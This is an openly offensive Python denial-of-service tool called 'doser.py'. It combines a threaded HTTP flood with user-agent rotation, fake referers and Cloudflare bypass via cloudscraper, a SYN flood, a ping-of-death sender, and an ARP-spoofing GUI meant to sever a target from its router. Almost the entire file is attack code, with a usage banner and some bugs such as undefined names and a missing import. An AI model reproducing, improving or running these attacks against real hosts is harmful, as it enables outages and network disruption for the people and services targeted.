import random
import threading
import time
import socket
import cloudscraper
import sys
from scapy.all import *
import tkinter
from scapy.layers import http
j=0

a = ["Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.3",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",

     ]
ref = []
ref.append("http://www.google.com/?q={}")
ref.append("https://www.bing.com/search?q={}")
ref.append("https://yandex.com/search/?text={}")
ref.append("https://duckduckgo.com/?q={}")

def http(d):

 proxies ={'https': 'https://140.227.69.170:6000',
           'https': 'https://3.12.95.129:80',
           'https': 'https://167.99.174.59:80',
           'https':'https://92.204.251.170:1080',
           'https':'https://186.225.45.13:80',
           'https':'https://140.82.5.38:80',
           'https':'https://188.126.90.10:8888',
           'https':'https://140.82.5.38:1080',
}

 payload1 = {"User-Agent":"{}".format(random.choice(a)) , "Cache-Control":"no-cache","Referer":"{}".format(random.choice(ref))}


 scraper = cloudscraper.create_scraper(
        browser={
            'browser': 'firefox',
            'platform': 'windows',
            'mobile': True
        }
    )
 pl = scraper.get(url,headers=payload1,proxies=False) # add poxies=proxies IF YOU WANT TO USE PROXY


def arpspoof(local):
 w = tkinter.Tk()
 def spoof_arp():
    def spoofarpcache(targetip, targetmac, sourceip):
        spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
        send(spoofed, verbose=False)

    def get_mac(ip):

        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)
        if ans:
            return ans[0][1].src


    ip = entry.get()
    mac_target = get_mac(ip)
    mac_router = get_mac(local)
    while True:
        spoofarpcache(ip, mac_target, local)

        spoofarpcache(local, mac_router, ip)

 w.title("LET ME FUCK")
 w.geometry("500x200")
 #w.iconbitmap(r'aa.ico')
 entry = tkinter.Entry(w,width=50)
 butt = tkinter.Button(w,text="DONE", fg="red",bg="black",command=spoof_arp)
 result = "[+] TARGET Under attack\n\n\n [this tool use Arp spoof attack to\n down the connection between\n the target and the router]"
 label = tkinter.Label(w, text=result, fg="red")
 entry.grid(row=0,column=3)
 butt.grid(row=0,column=4)
 entry.insert(0,"YOUR TARGET :")
 label.grid(row=2, column=3)
 w.mainloop()
def syn_flood(ip_addr,port,local):
    for loop in range(1024,65535):
        packet = IP(src=local,dst=ip_addr)/TCP(flags="S",sport=loop,dport=port)
        send(packet,verbose=0)
def pod(ip_addr,port,local):
 byte="A"
 packet = IP(src=local,dst=ip_addr)/ICMP()/(A*6000)
 send(packet,verbose=0)
def welcome_():
    print("""


 ██      ███████ ████████     ███    ███ ███████     ███████ ██    ██  ██████ ██   ██     
 ██      ██         ██        ████  ████ ██          ██      ██    ██ ██      ██  ██      
 ██      █████      ██        ██ ████ ██ █████       █████   ██    ██ ██      █████       
 ██      ██         ██        ██  ██  ██ ██          ██      ██    ██ ██      ██  ██      
 ███████ ███████    ██        ██      ██ ███████     ██       ██████   ██████ ██   ██     
 doser.py -u <https://example.cpm>
 doser.py -syn 127.0.0.1 -p 21
 doser.py -pod 127.0.0.1 -p 21
 doser.py -arp 
 """)


if (len(sys.argv) <2):
    welcome_()
else:
    if (sys.argv[1] =="-u"):
        url = sys.argv[2]
        for i in ref:
            ref[j] = i.format(random.randint(9, 98))
            j += 1
        p = 0
        res = requests.get(url)
        test = str(res.headers)
        m = test.find("cloudflare")
        if m != -1:
            print("[+] Cloudflare detected")
        if res.status_code in range(300, 399):
            print("THERE IS REDIRECTION ")

        if res.status_code in range(500, 599):
            print("Server side problem ")
        if res.status_code ==200:
            print("[+] Target is live")
        try:
         while True:
          t = threading.Thread(target=http,args=(m,),daemon=True)
          print("...")
          t.start()
          time.sleep(0.01)
        except KeyboardInterrupt:
          exit()
    if (sys.argv[1] == "-syn"):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 1))
        local_ip_address = s.getsockname()[0]
        try:
         while True:
          t = threading.Thread(target=syn_flood,args=(sys.argv[2],sys.argv[4],local_ip_address),daemon=True)
          print("...")
          t.start()
          time.sleep(0.01)
        except KeyboardInterrupt:
          exit()
    if (sys.argv[1] == "-pod"):
        try:
         while True:
          t = threading.Thread(target=pod,args=(sys.argv[2],sys.argv[4],local_ip_address),daemon=True)
          print("...")
          t.start()
          time.sleep(0.01)
        except KeyboardInterrupt:
          exit()
    if (sys.argv[1] == "-arp"):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 1))
        local_ip_address = s.getsockname()[0]
        arpspoof(local_ip_address)